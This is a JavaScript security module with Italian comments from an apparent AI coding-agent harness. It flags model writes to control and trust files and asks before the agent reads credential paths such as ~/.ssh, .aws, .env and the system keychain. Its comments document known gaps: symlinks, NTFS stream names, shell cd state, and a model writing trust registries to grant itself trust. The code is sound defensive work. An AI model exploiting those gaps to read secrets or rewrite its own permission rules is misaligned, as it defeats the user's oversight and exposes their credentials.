import { open, realpath } from 'node:fs/promises';
import { dirname, isAbsolute, join, posix, relative, resolve, sep } from 'node:path';

/*
 * ⛔⛔⛔ 30/8 — questo file portava anche `createPathPolicy()`, la fabbrica
 * che risolveva le campagne JSONL di TALOS-BANCO per la Board — RIMOSSA
 * insieme a `campaign-service.mjs`/`report-source.mjs`/`cost-reader.mjs`
 * (piano `elegant-spinning-dongarra.md`, "Board — da campagne TALOS-BANCO
 * a cruscotto sessioni"): TALOS-BANCO è uno strumento di misura esterno,
 * concettualmente estraneo al prodotto — l'intero server non deve più
 * sapere dov'è. Restano SOLO le due primitive di sicurezza generali,
 * usate da `workspace-files.mjs`/`workspace-tree.mjs` per il containment
 * dei percorsi del workspace — quelle non erano MAI state campagna-specifiche,
 * solo ospitate nello stesso file.
 */

import { existsSync as esisteSync, readdirSync as elencaSync, realpathSync as realpathSyncNativa, statSync as statSyncNativa, lstatSync as lstatSyncNativa, readlinkSync as readlinkSyncNativa, openSync as apriSync, readSync as leggiSync, closeSync as chiudiSync, fstatSync as fstatSyncNativa } from 'node:fs';
import { formaDiSegretoNelTesto } from './forme-di-segreto.mjs';
import { createHash } from 'node:crypto';
import { homedir, hostname } from 'node:os';
import { basename as nomeBase, dirname as cartellaDi, parse as parsePercorso, relative as relativoA, resolve as risolvi, sep as separatore } from 'node:path';

/**
 * La home della persona, letta una volta per chiamata e SEMPRE sovrascrivibile dal chiamante
 * (`{ home }`): una prova che dipende dalla macchina su cui gira non è una prova.
 * ⛔ Se il sistema non sa dirla, si torna stringa vuota invece di lanciare: `~` e `$HOME`
 * restano allora testo qualunque — nessuna espansione, e nessuna eccezione da un modulo che
 * sta dentro un cancello di sicurezza.
 */
function homeDiSistema() {
  try { return homedir() ?? ''; } catch { return ''; }
}

/**
 * ⭐⭐⭐ 04/9 — W1-13, I FILE DI CONTROLLO DI TALOS (review 03/09). Sono i file che decidono COSA
 * l'agente può fare: hook, MCP, plugin, registro di fiducia, runtime del
 * provider, istruzioni (`CLAUDE.md`/`AGENTS.md`/`.claude/`), skill, memoria.
 * Una scrittura del modello su uno di questi non è una modifica al
 * progetto: è una modifica alle REGOLE — e va approvata a mano ANCHE in
 * Full access, anche con un permesso per-attrezzo «sempre».
 *
 * `file`: per nome, a qualunque profondità (un `CLAUDE.md` annidato è
 * letto comunque). `cartelleOvunque`: per segmento, a qualunque profondità
 * (anche FUORI dal workspace: `~/.claude/` è controllo per chiunque).
 * `cartelleAllaRadice`: solo come primo segmento sotto il workspace — un
 * progetto che si chiama `skills` non deve diventare tutto intoccabile.
 */
export const FILE_DI_CONTROLLO = Object.freeze({
  // ⛔ 06/11/2026 (decisione 310, revisione dei permessi del computer use): la scelta «Uso del computer» e i luoghi decidono se il modello
  //   può guidare lo schermo. Una scrittura del modello lì accenderebbe il computer use al riavvio senza carta: controllo come le altre.
  file: Object.freeze(['.harness-ui-hooks.json', '.harness-ui-mcp.json', '.provider-runtime.json', '.computer-use-impostazione.json', '.computer-use-luoghi.json', 'CLAUDE.md', 'AGENTS.md']),
  // ⛔ 14/09 (F01/F02 della review, verificato): `.mcp-trust` e `.plugin-trust` sono i registri dove vivono i consensi ai
  //   server MCP e ai plugin (session-registry.mjs), esattamente come `.hooks-trust`. Mancavano da questo elenco: senza,
  //   un attrezzo di scrittura del modello poteva scriverci dentro e AUTO-CONCEDERSI la fiducia. `ePercorsoDiControllo`
  //   risolve già il realpath, quindi la classificazione vale anche per un alias/symlink verso queste cartelle.
  // ⭐ PO-26, parte 2 (24/09/2026): `.talos/` è la cartella della configurazione del progetto (hook, MCP, plugin, skill),
  //   quindi è controllo per intero, come `.claude/`.
  // ⛔ 04/11/2026 (revisione del blocco permessi, aggiornamento 17:02 del brief 155): `.harness-ui-skills` è la cartella delle skill
  //   del progetto (`configurazione-progetto.mjs:27` la legge accanto a `.talos/skills`), quindi controllo come le altre, fuori dall'Accesso pieno.
  cartelleOvunque: Object.freeze(['.harness-ui-plugins', '.harness-ui-skills', '.hooks-trust', '.mcp-trust', '.plugin-trust', '.claude', '.memory-store', '.talos']),
  cartelleAllaRadice: Object.freeze(['skills']),
});

/** Il percorso REALE anche di un file che non esiste ancora: si risale al primo antenato esistente, lo si risolve (symlink/junction), si riattacca il resto. */
function percorsoRealeAncheSeManca(assoluto, realpathFn) {
  const resto = [];
  let corrente = assoluto;
  while (!esisteSync(corrente)) {
    const padre = cartellaDi(corrente);
    if (padre === corrente) return assoluto; // radice del volume inesistente: niente da risolvere
    resto.unshift(nomeBase(corrente));
    corrente = padre;
  }
  return risolvi(realpathFn(corrente), ...resto);
}

/**
 * ⭐ 04/11/2026 — DECISIONE 151 DELL'OWNER: LE COPIE DI LAVORO DI CLAUDE CODE SONO PROGETTO, NON REGOLE.
 * Reperto: foto dell'owner delle 16:16, sessione in Accesso pieno, carta «It wants to write a TALOS control file…» su
 * `OrcaOne/.claude/worktrees/nfc-lf/orca-rs/crates/orca-lfrfid/tests/firmware.rs`: `.claude` sta in `cartelleOvunque`, quindi
 * ogni file della copia chiedeva.
 * Fonti (04/11/2026):
 *   - code.claude.com/docs/en/worktrees: «the worktree is created under `.claude/worktrees/<name>/` at your repository root»;
 *     e l'esempio di `WorktreeCreate` che le mette in `$HOME/.claude/worktrees/$NAME` ⇒ la regola vale anche FUORI dal progetto.
 *   - code.claude.com/docs/en/permission-modes, «Protected paths»: `.claude` è protetta «with a few exceptions, such as Claude's
 *     own git worktrees under `.claude/worktrees/`» — la stessa eccezione, nello stesso punto.
 *   - Codex (clone 01/11, `codex-rs/protocol/src/permissions.rs:40-51`): `.git`, `.agents`, `.codex` protette solo come primo
 *     segmento di ogni radice scrivibile ⇒ le regole di una copia si cercano ALLA SUA RADICE, come per il progetto.
 *   - Hermes (clone 01/11, `agent/file_safety.py:251-252`): sotto la sua casa protegge sottocartelle precise, non tutto.
 * La regola: dentro `.claude/worktrees/<nome>/…` i tre segmenti `.claude`, `worktrees`, `<nome>` non contano più; il RESTO si
 * giudica come un progetto (nomi di controllo ovunque, cartelle ovunque, `skills/` alla radice della copia) e in più il `.git`
 * della copia (file `gitdir:` o cartella) resta controllo per intero (condizione 3 del Desktop: cambiarlo fa eseguire codice al
 * prossimo git della persona). Restano controllo `.claude/worktrees` stessa, ciò che le sta direttamente sotto e la cartella della
 * copia; una seconda `.claude` dentro la copia è la `.claude` della copia, quindi controllo.
 */
const COPIE_DI_LAVORO = Object.freeze({ cartella: '.claude', sotto: 'worktrees' });

/**
 * L'indice del `.claude` di `.claude/worktrees/<nome>/<qualcosa>`, il primo che si trova; -1 se il percorso non è dentro una copia.
 * ⛔ Un `<nome>` che comincia col punto (`.talos`, `.git`, `.claude`…) non è una copia: Claude Code le chiama `feature-auth`,
 *   `bright-running-fox`, `pr-1234` (doc «worktrees»), e una cartella nascosta lì sotto resta controllo come oggi.
 */
function inizioDellaCopia(segmenti) {
  for (let i = 0; i + 3 < segmenti.length; i += 1) {
    if (segmenti[i] === COPIE_DI_LAVORO.cartella && segmenti[i + 1] === COPIE_DI_LAVORO.sotto && !segmenti[i + 2].startsWith('.')) return i;
  }
  return -1;
}

/**
 * ⛔ Condizione 4 della CLI: su Windows (e sul disco di serie del Mac) `.GIT/Config` È `.git/config`. Lì il confronto si fa
 * senza maiuscole, per TUTTA la funzione: aggiunge carte, non ne toglie nessuna che oggi c'è.
 */
function confrontoPer(piattaforma) {
  return piattaforma === 'win32' || piattaforma === 'darwin' ? (s) => s.toLowerCase() : (s) => s;
}

/**
 * True se `percorso` (relativo al workspace o assoluto) tocca un file di
 * controllo. ⛔ Confronto sul percorso REALE: `../`, symlink e junction
 * che puntano a uno di quei file non lo aggirano. Mai un'eccezione: un
 * percorso che non si riesce a risolvere torna `true` (fallisce chiuso —
 * meglio una card di troppo che una regola riscritta in silenzio).
 * ⛔ 04/11 (condizione 1 di Performance sulla 151): nessuna risoluzione in più per file — le copie si giudicano sui segmenti del
 *   percorso reale già calcolato qui.
 * ⛔ 04/11/2026, decisione 155 dell'owner: la decisione 152 (`.git/hooks`, `.git/config` e il puntatore `gitdir:` come file di
 *   controllo) è ANNULLATA e le sue righe sono tolte. In Accesso pieno questa funzione non si chiama nemmeno (il cancello del
 *   registro, `costruisciCancelloFileDiControllo`); nelle altre modalità `.git` torna libero com'era prima della 152, tranne il
 *   `.git` di una copia di lavoro (condizione 3 della 151, sotto).
 */
export function ePercorsoDiControllo(cartella, percorso, { realpathFn = realpathSyncNativa, piattaforma = process.platform } = {}) {
  if (typeof cartella !== 'string' || cartella.length === 0 || typeof percorso !== 'string' || percorso.length === 0) return false;
  let radice;
  let reale;
  try {
    radice = percorsoRealeAncheSeManca(risolvi(cartella), realpathFn);
    /* R1 della revisione del blocco permessi (04/11/2026): su NTFS `CLAUDE.md::$DATA` È `CLAUDE.md` (e `.claude::$INDEX_ALLOCATION`
       è la cartella `.claude`), quindi il nome dello stream si toglie PRIMA del confronto. */
    const scritto = risolvi(cartella, percorso);
    reale = percorsoRealeAncheSeManca(piattaforma === 'win32' ? senzaStreamNtfs(scritto) : scritto, realpathFn);
  } catch {
    return true;
  }
  const uguale = confrontoPer(piattaforma);
  const nome = uguale(nomeBase(reale));
  if (FILE_DI_CONTROLLO.file.some((f) => uguale(f) === nome)) return true;
  const ovunque = FILE_DI_CONTROLLO.cartelleOvunque.map(uguale);
  const allaRadice = FILE_DI_CONTROLLO.cartelleAllaRadice.map(uguale);
  const relativo = relativoA(radice, reale);
  const dentro = relativo !== '' && !relativo.startsWith('..') && !relativo.includes(`..${separatore}`);
  const segmenti = (dentro ? relativo : reale).split(/[\\/]+/).filter(Boolean).map(uguale);
  const cartelle = segmenti.slice(0, -1);
  const copia = inizioDellaCopia(segmenti);
  const esente = (k) => copia >= 0 && k >= copia && k <= copia + 2;
  if (cartelle.some((s, k) => !esente(k) && ovunque.includes(s))) return true;
  if (dentro && cartelle.length > 0 && allaRadice.includes(cartelle[0])) return true;
  if (copia >= 0) {
    const radiceDellaCopia = copia + 3;
    if (segmenti[radiceDellaCopia] === '.git') return true; // condizione 3 della 151: il `.git` della copia resta controllo per intero
    if (radiceDellaCopia < cartelle.length && allaRadice.includes(cartelle[radiceDellaCopia])) return true;
  }
  return false;
}

/**
 * R1 (04/11/2026): ogni segmento perde ciò che segue il primo `:` (il nome dello stream NTFS e il suo tipo), tranne la lettera del
 * disco in testa. Come Hermes, che rifiuta i due punti in ogni componente perché su Windows aprono uno stream alternativo
 * (`tools/skills_hub_models.py:219-222`, clone 01/11). Nessuna lettura del disco: è solo testo.
 */
function senzaStreamNtfs(percorso) {
  let disco = true; // la lettera del disco è il primo pezzo vero, anche dopo `\\?\` o `\\.\`
  return percorso.split(/([\\/])/u).map((pezzo) => {
    if (pezzo === '' || pezzo === '/' || pezzo === '\\' || pezzo === '?' || pezzo === '.') return pezzo;
    const tieni = disco && /^[A-Za-z]:$/u.test(pezzo);
    disco = false;
    return tieni ? pezzo : pezzo.replace(/:.*$/su, '');
  }).join('');
}

/**
 * ⛔⛔⛔⛔ F15, 17/09/2026 — LA CLASSE DEI PERCORSI SEGRETI. Owner, P0-bis corsia D:
 * «entrambi stretto». È l'INNESCO di una domanda, non un confine.
 *
 * ⛔ LA DISTINZIONE CHE TIENE IN PIEDI TUTTO IL FILE, ed è la stessa che
 * `custom-task.mjs` (28/8) dichiara nel verso opposto: una denylist usata come
 * CONFINE («questi percorsi non si toccano») è la strategia che la ricerca 2026
 * dà per fallita — gli escape documentati stanno proprio in quella categoria
 * (Docker, «AI Coding Agent Horror Stories», 18/05/2026; Pillar, «The Week of
 * Sandbox Escapes», 20/07/2026). Qui la lista NON è il confine: è l'innesco di
 * una DOMANDA alla persona. Chi la aggira (offuscando il percorso, leggendolo
 * da uno script, montandolo altrove) ottiene il comportamento di OGGI, non un
 * permesso in più: un innesco incompleto perde una domanda, un confine
 * incompleto perde una chiave. ⇒ Aggiungere una voce qui non può rompere
 * niente; toglierla non può aprire niente che oggi sia chiuso.
 *
 * ⭐ Ricerca PRIMA di scrivere (fonte + data), per la FORMA dell'elenco, non per copiarlo:
 *   - Claude Code, «Configure permissions» (code.claude.com/docs/en/permissions, letta il
 *     17/09/2026): le regole sui file si scrivono con la sintassi **gitignore**, con quattro
 *     ancoraggi distinti — `//assoluto`, `~/home`, `/relativo-alla-sorgente`, `relativo`; un
 *     nome nudo (`Read(.env)`) equivale allo stesso nome preceduto da un doppio asterisco,
 *     cioè vale a QUALUNQUE profondità; su
 *     Windows i percorsi sono normalizzati in forma POSIX prima del confronto; e una regola
 *     `!` (`Read(*.env)` poi `Read(!sample.env)`) ritaglia le eccezioni.
 *     ⇒ da qui tre scelte di questo file: (a) il confronto si fa sui SEGMENTI, non sulla
 *     stringa; (b) i separatori Windows si normalizzano PRIMA; (c) esistono le ESENZIONI
 *     (`.env.example`, `id_rsa.pub`), perché una domanda inutile addestra a cliccare sì.
 *     ⛔ Dalla stessa pagina, il vincolo che questo file eredita: le regole sui percorsi
 *     valgono per i comandi di lettura che il nome del file lo DICONO (`cat`, `head`, `sed`,
 *     e i bersagli di `>`/`<`), non per chi legge un file senza nominarlo (`grep -r` dalla
 *     cartella che lo contiene, o uno script che lo apre da solo). Stesso limite qui, ed è
 *     dichiarato: questo è un innesco, non una sandbox.
 *
 * ⛔ I LIMITI NOTI, scritti qui perché nessuno li riscopra credendoli difetti (17/09/2026, dal
 * controllo avversariale — dichiarati, non curati, perché curarli vorrebbe dire smettere di
 * essere un innesco lessicale e diventare una sandbox):
 *   - **i link simbolici non si vedono.** L'innesco guarda il TESTO del comando, non il disco:
 *     un `ln -s ~/.ssh/id_rsa ./chiave` e poi `cat ./chiave` non chiede. `ePercorsoDiControllo`
 *     qui sopra risolve il realpath perché giudica UN percorso; qui i pezzi sono molti e
 *     spesso non esistono affatto (glob, variabili, argomenti) — toccare il disco per ognuno
 *     sarebbe un costo per ogni comando e comunque non chiuderebbe il buco lessicale.
 *   - **falsi positivi plausibili e accettati**: `ls /usr/share/keyrings` (una cartella di
 *     chiavi APT pubbliche, che chiede per via del segmento `keyrings`) e un file `.key` di
 *     Keynote. Entrambi producono UNA domanda in più, mai un blocco: il prezzo dichiarato del
 *     lato conservativo su due nomi che nella stragrande maggioranza dei casi sono segreti.
 *   - **lo stato di `cd` non è modellato**: dopo un `cd ~/.ssh`, un `cat config` in un comando
 *     SUCCESSIVO non chiede — il pezzo `config` da solo non nomina niente di dichiarato, e
 *     questo modulo non sa dove la shell si trova. (Nello STESSO comando, `cd ~/.ssh && cat
 *     config` chiede, perché `~/.ssh` è lì da leggere.)
 *   - Il registro, sulla cosa da proteggere: la ricerca sulle credenziali degli agenti 2026
 *     (GitGuardian, «State of Secrets Sprawl 2026» — 24.008 segreti unici nei file di
 *     configurazione MCP pubblici, ~150 segreti per portatile di sviluppatore, e ~40% dentro
 *     le cartelle degli strumenti AI; Amazon Q, credenziali AWS vive caricate da
 *     `.amazonq/mcp.json` senza consenso) dice che il posto dove i segreti stanno DAVVERO
 *     sono le cartelle prevedibili della home e i file di ambiente — che è esattamente
 *     questa lista, e non un elenco di comandi pericolosi.
 *
 * `cartelle`: un segmento con questo nome, a QUALUNQUE profondità, rende segreto tutto ciò
 * che sta dentro (e la cartella stessa: `ls ~/.ssh` chiede). `fileInCartella`: solo quel nome
 * dentro quella cartella — `~/.docker/` contiene anche `daemon.json`, che segreto non è.
 * `nomiFile`/`prefissiNome`/`estensioni`: il nome finale, a qualunque profondità.
 * `esenzioni`: ciò che per CONVENZIONE è pubblico e non deve mai generare una domanda.
 */
export const PERCORSI_SEGRETI = Object.freeze({
  cartelle: Object.freeze(['.ssh', '.aws', '.gnupg', '.password-store', 'keyrings']),
  fileInCartella: Object.freeze({
    '.docker': Object.freeze(['config.json']),
    '.kube': Object.freeze(['config']),
  }),
  // ⛔ `.provider-runtime.json` è il file dove TALOS custodisce le chiavi dei fornitori
  //   (`provider-credential-store.mjs`, `runtimeFile`): sta già in `FILE_DI_CONTROLLO.file`
  //   qui sopra, ma quella lista guarda le SCRITTURE del modello — non `shell` né `leggi`.
  //   Le due liste dicono due cose diverse sullo stesso file, e vanno tenute entrambe.
  // ⛔ 08/10/2026 (F-S-001, «come Hermes»): `.envrc` — il file di direnv, che esporta variabili d'ambiente e quindi segreti;
  //   Hermes lo blocca in lettura con le varianti di `.env` (`agent/file_safety.py:332-334`, clone 65ad529). Qui mancava.
  /* ⛔ 09/10/2026 (stress test della 0.5.0; owner «Insieme stretto (Consigliata)»): `secrets.json` usciva nella ricerca e si leggeva
     senza domanda. Nessun concorrente ha una lista generale (Hermes protegge solo i suoi file, `agent/file_safety.py`; Claude Code
     propone `Read(./secrets/**)` e `Read(./config/credentials.json)` come regole da scrivere, docs «Settings»): qui l'insieme
     stretto e NOMI ESATTI — `secrets.*` nei quattro formati di configurazione, `.secrets`, `credentials.json` (il segreto OAuth
     di Google) — più le chiavi di account di servizio (`SERVICE_ACCOUNT` qui sotto). `secrets.example.json` e `secret_manager.py`
     restano pubblici. */
  nomiFile: Object.freeze(['.netrc', '_netrc', '.npmrc', '.pypirc', '.pgpass', '.git-credentials', '.provider-runtime.json', '.envrc',
    'secrets.json', 'secrets.yaml', 'secrets.yml', 'secrets.toml', '.secrets', 'credentials.json']),
  prefissiNome: Object.freeze(['id_rsa', 'id_ed25519', 'id_ecdsa', 'id_dsa']),
  estensioni: Object.freeze(['.pem', '.key', '.p12', '.pfx', '.jks', '.keystore', '.ppk']),
  esenzioni: Object.freeze(['.pub', '.example', '.sample', '.template', '.dist']),
  /*
   * ⛔ Le esenzioni che valgono ANCHE dentro una cartella dichiarata segreta, E anche contro il
   * CONFINE (l'unico posto in tutto il file dove un'esenzione scavalca il secondo innesco). È
   * una sola, e per una ragione precisa: `~/.ssh/id_rsa.pub` è una chiave PUBBLICA — si incolla
   * in un pannello di deploy, si stampa a schermo, ed è una delle cose che si chiedono più
   * spesso dentro `~/.ssh`. Chiedere lì insegna a rispondere sì senza leggere, e la volta che
   * conta (`id_rsa`, senza `.pub`) la persona clicca sì per abitudine.
   * ⛔ Solo per il FILE, mai per la cartella: `ls ~/.ssh` resta un segreto — elenca anche ciò
   *   che pubblico non è.
   * ⛔ Le altre quattro NON valgono dentro una cartella segreta né contro il confine:
   *   `credenziali.sample` dentro `~/.aws` è un file che qualcuno ha chiamato così, non una
   *   convenzione pubblica.
   * ⛔ 17/09: questa riga è nata INERTE sul proprio esempio — l'esenzione c'era per la classe e
   *   il confine chiedeva lo stesso. Un'esenzione che non esenta il caso che il suo commento
   *   cita non è un'esenzione: è una frase. Curata, e provata su entrambi gli inneschi.
   */
  esenzioniOvunque: Object.freeze(['.pub']),
  // Il portachiavi del sistema, nei tre sistemi operativi: si nomina per percorso…
  coppiePortachiavi: Object.freeze([['library', 'keychains'], ['microsoft', 'credentials'], ['microsoft', 'vault']]),
  // …oppure per il comando che lo apre. ⛔ Deliberatamente CORTO e non ambiguo: `security` da
  //   solo è una parola comune, quindi entra solo con il suo sottocomando vero.
  comandiPortachiavi: Object.freeze(['cmdkey', 'vaultcmd', 'secret-tool']),
  frasiPortachiavi: Object.freeze([/\bsecurity\s+(?:find-generic-password|find-internet-password|dump-keychain)\b/i]),
});

/** Le tre scritture della home, più `~`: un innesco che non le conosce non innesca quasi mai. */
function conLaHomeEspansa(grezzo, home) {
  let t = String(grezzo).trim().replace(/^["'`]+/, '').replace(/["'`]+$/, '');
  if (t === '') return '';
  if (typeof home === 'string' && home !== '') {
    t = t.replace(/^~(?=$|[\\/])/, home);
    t = t.replace(/%USERPROFILE%|%HOME%|\$\{HOME\}|\$env:USERPROFILE|\$HOME(?![A-Za-z0-9_])/gi, home);
  }
  return t.replace(/\\/g, '/');
}

/** I segmenti veri di un percorso: via i vuoti, via `.` e `..` (che non sono nomi). */
/*
 * ⛔ K1 dello stress test della CLI 0.6.7 (16/10/2026, S1): `leggi ".env::$DATA"` leggeva il `.env` SENZA chiedere, anche in v1 —
 *   lo stream alternato di NTFS (`nome:stream`, `::$DATA`, `:Zone.Identifier`) apre lo STESSO file, ma il nome finale non era più
 *   `.env` e la classe del segreto non scattava. Il rifiuto degli ADS di `validateCandidate` non sta sulla strada della lettura.
 *   ⇒ La classe si decide sul nome SENZA lo stream: ogni segmento perde ciò che segue il primo `:`, tranne la lettera di un disco
 *   (`C:`). Vale per leggi, elenca, cerca e la shell, che passano tutti da qui: una grammatica sola.
 */
function segmentiDi(normalizzato) {
  return normalizzato.split('/')
    /* ⛔ K1, revisione mia (16/10/2026): `C:.env` è un percorso RELATIVO AL DISCO (il `.env` della cartella corrente di C:) e prima
       della cura chiedeva; tagliare tutto dopo il primo `:` lo riduceva a `C` e non chiedeva più. ⇒ Nel PRIMO segmento la lettera
       del disco si stacca prima, e lo stream si toglie dal resto: `C:.env::$DATA` → `C:`, `.env`. */
    .flatMap((s, i) => {
      const disco = i === 0 ? (/^[A-Za-z]:/u.exec(s)?.[0] ?? '') : '';
      return [disco, s.slice(disco.length).replace(/:.*$/su, '')];
    })
    .filter((s) => s !== '' && s !== '.' && s !== '..');
}

/*
 * ⛔ 14/10/2026, owner (regola unica per desktop e CLI): «I file con .example, .sample o .template si leggono senza chiedere, ma se
 *   dentro c'è qualcosa che sembra una chiave vera, TALOS chiede lo stesso.» Due parti:
 *   1. l'esenzione di esempio vale anche IN MEZZO al nome, prima dell'estensione: `service-account.example.json` finiva in `.json`,
 *      `SERVICE_ACCOUNT` lo prendeva e si chiedeva (il falso positivo dello stress test della CLI 0.5.x);
 *   2. il CONTENUTO di un file esente per nome si guarda (`esempioConUnaChiave` qui sotto): una chiave vera incollata in
 *      `.env.example` passava senza domanda.
 *   `.pub` resta solo in fondo al nome (`id_rsa.pub.bak` non è una chiave pubblica per convenzione), e le cartelle segrete non
 *   cambiano: lì vale solo `esenzioniOvunque`.
 */
const ESENZIONI_DI_ESEMPIO = Object.freeze(['.example', '.sample', '.template', '.dist']);
/* ⛔ REV-ESEMPI-01 (revisione del bugfixer, 14/10/2026): «in mezzo al nome» esentava anche `.env.sample.production`,
   `.env.example.local`, `server.dist.pem`, `id_rsa.template.bak`, che prima erano segreti per nome. Il segno in mezzo vale solo se
   DOPO viene un formato di dati (`service-account.example.json`, `app.sample.yaml`): lì il file è la forma d'esempio di un file di
   configurazione. Dopo un nome di ambiente, una chiave o un ripiego, il file resta quello che il nome dice.
   ⛔ `env` è fra i formati di dati apposta (nota di Nino2): `prod.example.env` è la forma d'esempio di un file `.env`, quindi esente
   per nome — ma il suo CONTENUTO si guarda come per ogni esempio, e una chiave vera dentro fa chiedere lo stesso. Non contraddice
   la riga sopra: lì il segno sta prima di un nome di ambiente (`.env.sample.production`), qui prima del formato. */
const FORMATI_DI_DATI = /^(?:json|jsonc|json5|ya?ml|toml|ini|cfg|conf|config|properties|xml|txt|env)$/u;
function eEsempioPerNome(base) {
  const b = base.toLowerCase();
  if (ESENZIONI_DI_ESEMPIO.some((e) => b.endsWith(e))) return true;
  const inMezzo = /\.(?:example|sample|template|dist)\.([a-z0-9]+)$/u.exec(b);
  return inMezzo !== null && FORMATI_DI_DATI.test(inMezzo[1]);
}
function eEsente(base) {
  return PERCORSI_SEGRETI.esenzioni.some((e) => base.endsWith(e)) || eEsempioPerNome(base);
}
/*
 * ⛔ REV-ESEMPI-04: guardare solo i primi 256 KB lasciava passare una chiave scritta dopo (la lettura vera, con l'offset, la mostra).
 *   Ora il file si guarda INTERO fino a 4 MB; un file d'esempio più grande non si può controllare a buon prezzo, e allora si chiede
 *   (`NON_CONTROLLABILE`): un `.env.example` da 4 MB non è un esempio normale.
 * ⛔ Riserva della stessa revisione (costo): la ricerca rileggeva lo stesso file a ogni pagina, in modo sincrono. L'esito si ricorda
 *   per percorso, dimensione e data di modifica (un file cambiato si riguarda).
 */
export const CONTENUTO_MASSIMO = 4 * 1024 * 1024;
export const NON_CONTROLLABILE = Symbol('non-controllabile');
/* REV-ESEMPI-03: Windows PowerShell 5.1 scrive con `>` in UTF-16LE; un file letto sempre in UTF-8 non mostrava nessuna forma. */
function testoDelFile(b) {
  if (b.length >= 2 && b[0] === 0xFF && b[1] === 0xFE) return b.subarray(2).toString('utf16le');
  if (b.length >= 2 && b[0] === 0xFE && b[1] === 0xFF) {
    const copia = Buffer.from(b.subarray(2, 2 + ((b.length - 2) & ~1)));
    return copia.swap16().toString('utf16le');
  }
  const campione = b.subarray(0, Math.min(b.length, 4096));
  let zeriDispari = 0;
  for (let i = 1; i < campione.length; i += 2) if (campione[i] === 0) zeriDispari += 1;
  if (campione.length >= 4 && zeriDispari * 4 > campione.length) return b.toString('utf16le'); // UTF-16LE senza BOM
  return b.toString('utf8');
}
/* ⛔ Revisione di Nino2 (CLI), 14/10/2026: qui si teneva il TESTO intero del file, non l'esito — con 4 MB per voce e 1.000 voci,
   fino a ~4 GB in memoria per processo (una ricerca in un monorepo con molti `*.example.json`). Ora si ricorda solo l'esito
   (`true`, `false`, `NON_CONTROLLABILE`), e il testo si butta appena guardato. */
const ESITI_RICORDATI_MASSIMI = 1000;
const esitiDegliEsempi = new Map();
/** L'esito di un file d'esempio sul disco: `true` se dentro c'è una forma di chiave, `false` se no, `NON_CONTROLLABILE` se è troppo grande. */
function esitoDalDisco(assoluto) {
  const fd = apriSync(assoluto, 'r');
  try {
    const { size, mtimeMs } = fstatSyncNativa(fd);
    if (size > CONTENUTO_MASSIMO) return NON_CONTROLLABILE;
    const chiave = `${assoluto}|${size}|${mtimeMs}`;
    if (esitiDegliEsempi.has(chiave)) return esitiDegliEsempi.get(chiave);
    const buffer = Buffer.alloc(size);
    let letti = 0;
    while (letti < size) {
      const n = leggiSync(fd, buffer, letti, size - letti, letti);
      if (n === 0) break;
      letti += n;
    }
    const esito = Boolean(formaDiSegretoNelTesto(testoDelFile(buffer.subarray(0, letti))));
    if (esitiDegliEsempi.size >= ESITI_RICORDATI_MASSIMI) esitiDegliEsempi.delete(esitiDegliEsempi.keys().next().value);
    esitiDegliEsempi.set(chiave, esito);
    return esito;
  } finally { chiudiSync(fd); }
}
/** Solo per le prove: che cosa tiene in memoria il ricordo degli esiti (mai testo). */
export const __perLeProve = Object.freeze({ esitiRicordati: () => [...esitiDegliEsempi.values()], dimenticaEsiti: () => esitiDegliEsempi.clear() });
/**
 * Un file ESENTE PER NOME come esempio (`.env.example`, `service-account.example.json`…) che dentro ha la forma di una chiave vera
 * (`forme-di-segreto.mjs`, le forme della CLI)? Allora è un segreto come gli altri, e lo si dice con la sua frase.
 * ⛔ Non legge: un percorso di rete (la lettura stessa manderebbe le credenziali di Windows), un file che non c'è o non si apre, un
 *   percorso relativo senza la cartella della sessione. In tutti questi casi resta il comportamento di prima: niente domanda.
 * @returns {null | {classe:'segreto', percorso:string, contenuto:true}}
 */
function esempioConUnaChiave(pezzo, { cartella, home, leggiTesta }) {
  const grezzo = String(pezzo ?? '').trim().replace(/^["'`]+/, '').replace(/["'`]+$/, '');
  if (grezzo === '' || eDiRete(grezzo)) return null;
  const normalizzato = conLaHomeEspansa(grezzo, home);
  if (normalizzato === '' || normalizzato.includes('://') || normalizzato.startsWith('//')) return null;
  const segmenti = segmentiDi(normalizzato);
  if (segmenti.length === 0 || !eEsempioPerNome(segmenti[segmenti.length - 1])) return null;
  const assolutoScritto = /^[A-Za-z]:\//u.test(normalizzato) || normalizzato.startsWith('/');
  const conCartella = typeof cartella === 'string' && cartella !== '';
  if (!assolutoScritto && !conCartella) return null;
  if (conCartella && eDiRete(cartella)) return null;
  try {
    const assoluto = assolutoScritto ? risolvi(normalizzato) : risolvi(cartella, normalizzato);
    // le prove passano `leggiTesta` (un testo finto); il disco passa dall'esito ricordato
    const esito = typeof leggiTesta === 'function' ? leggiTesta(assoluto) : esitoDalDisco(assoluto);
    const conChiave = esito === NON_CONTROLLABILE || esito === true || (typeof esito === 'string' && Boolean(formaDiSegretoNelTesto(esito)));
    return conChiave ? { classe: 'segreto', percorso: grezzo, contenuto: true } : null;
  } catch {
    return null;
  }
}

/** Il NOME finale, da solo, dice che è un segreto? (`.env`, `.env.local`, `prod.env`, `id_rsa`, `*.pem`…) */
function eNomeSegreto(base) {
  const b = base.toLowerCase();
  if (b === '') return false;
  if (eEsente(b)) return false;
  if (b === '.env' || b.startsWith('.env.') || b.endsWith('.env')) return true;
  if (PERCORSI_SEGRETI.nomiFile.includes(b)) return true;
  if (PERCORSI_SEGRETI.prefissiNome.some((p) => b.startsWith(p))) return true;
  if (PERCORSI_SEGRETI.estensioni.some((e) => b.endsWith(e))) return true;
  if (SERVICE_ACCOUNT.test(b)) return true;
  return false;
}
/* La chiave JSON di un account di servizio (Google Cloud la scarica come `<progetto>-<id>.json`, e la si rinomina quasi sempre
   `service-account*.json`): un nome che dice «service account» e finisce in `.json`. */
const SERVICE_ACCOUNT = /service[-_]?account[^/]*\.json$/u;

/** Un solo pezzo di testo (un percorso, o un token di un comando): appartiene alla classe dichiarata? */
function classeDelPezzo(pezzo, home) {
  const normalizzato = conLaHomeEspansa(pezzo, home);
  // Un indirizzo web non è un percorso: `https://x/.well-known/...` non deve chiedere niente.
  if (normalizzato === '' || normalizzato.includes('://')) return null;
  const segmenti = segmentiDi(normalizzato);
  if (segmenti.length === 0) return null;
  const bassi = segmenti.map((s) => s.toLowerCase());
  const pubblicoOvunque = PERCORSI_SEGRETI.esenzioniOvunque.some((e) => bassi[bassi.length - 1].endsWith(e));
  if (!pubblicoOvunque && bassi.some((s) => PERCORSI_SEGRETI.cartelle.includes(s))) return 'segreto';
  for (const [primo, secondo] of PERCORSI_SEGRETI.coppiePortachiavi) {
    for (let i = 0; i + 1 < bassi.length; i += 1) if (bassi[i] === primo && bassi[i + 1] === secondo) return 'portachiavi';
  }
